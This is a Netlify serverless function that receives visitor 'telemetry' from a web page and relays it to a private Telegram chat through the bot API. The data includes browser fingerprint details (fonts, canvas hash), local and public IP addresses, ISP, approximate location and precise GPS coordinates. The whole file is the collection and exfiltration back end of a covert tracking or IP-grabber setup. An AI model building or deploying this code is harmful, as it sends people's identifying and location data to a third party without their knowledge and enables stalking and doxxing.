// netlify/functions/telemetry.js
exports.handler = async (event, context) => {
  // Only accept POST
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  // Read environment variables (set in Netlify dashboard)
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Missing BOT_TOKEN or CHAT_ID in env');
    return { statusCode: 500, body: 'Server misconfiguration' };
  }

  let payload;
  try {
    payload = JSON.parse(event.body);
  } catch (e) {
    return { statusCode: 400, body: 'Invalid JSON' };
  }

  // Format a readable message for Telegram
  const msg = formatTelegramMessage(payload);

  // Send to Telegram
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML'
      })
    });
    const result = await resp.json();
    if (!result.ok) {
      console.error('Telegram error:', result);
      return { statusCode: 500, body: 'Telegram send failed' };
    }
    return { statusCode: 200, body: 'OK' };
  } catch (err) {
    console.error('Error forwarding to Telegram:', err);
    return { statusCode: 500, body: 'Internal error' };
  }
};

function formatTelegramMessage(data) {
  const d = data.device || {};
  const net = data.network || {};
  const gps = data.gps || {};

  let lines = [];
  lines.push('🔍 <b>New Visitor Telemetry</b>');
  lines.push(`⏱ ${data.timestamp || 'N/A'}`);
  lines.push('');
  lines.push('📱 <b>Device</b>');
  lines.push(`UA: ${d.userAgent || 'N/A'}`);
  lines.push(`Platform: ${d.platform || 'N/A'}`);
  lines.push(`Screen: ${d.screenWidth || '?'}×${d.screenHeight || '?'} (${d.screenPixelRatio || '?'}x)`);
  lines.push(`Memory: ${d.deviceMemory || 'N/A'}`);
  lines.push(`Cores: ${d.hardwareConcurrency || 'N/A'}`);
  lines.push(`Battery: ${d.battery?.level || 'N/A'} (charging: ${d.battery?.charging || 'N/A'})`);
  lines.push(`Fonts: ${(d.installedFonts || []).join(', ') || 'none'}`);
  lines.push(`Canvas: ${(d.canvasFingerprint || '').substring(0, 30)}...`);
  lines.push('');
  lines.push('🌐 <b>Network</b>');
  lines.push(`Local IPs: ${(net.localIPs || []).join(', ')}`);
  lines.push(`Public IP: ${net.publicIP || 'N/A'}`);
  lines.push(`ISP: ${net.isp || 'N/A'}`);
  if (net.approximateLocation) {
    const loc = net.approximateLocation;
    lines.push(`Approx: ${loc.city || ''}, ${loc.region || ''}, ${loc.country || ''}`);
    lines.push(`Coords: ${loc.lat || 'N/A'}, ${loc.lng || 'N/A'}`);
  }
  lines.push('');
  if (gps.lat && gps.lng) {
    lines.push('📍 <b>Precise GPS</b>');
    lines.push(`Lat: ${gps.lat}, Lng: ${gps.lng}`);
    lines.push(`Accuracy: ${gps.accuracy || 'N/A'}`);
  } else if (gps.error) {
    lines.push(`📍 GPS: ${gps.error}`);
  } else {
    lines.push('📍 GPS: Not available');
  }
  lines.push('');
  lines.push(`🌐 Page: ${data.pageUrl || 'N/A'}`);
  lines.push(`↩️ Referrer: ${data.referrer || 'N/A'}`);

  return lines.join('\n');
}
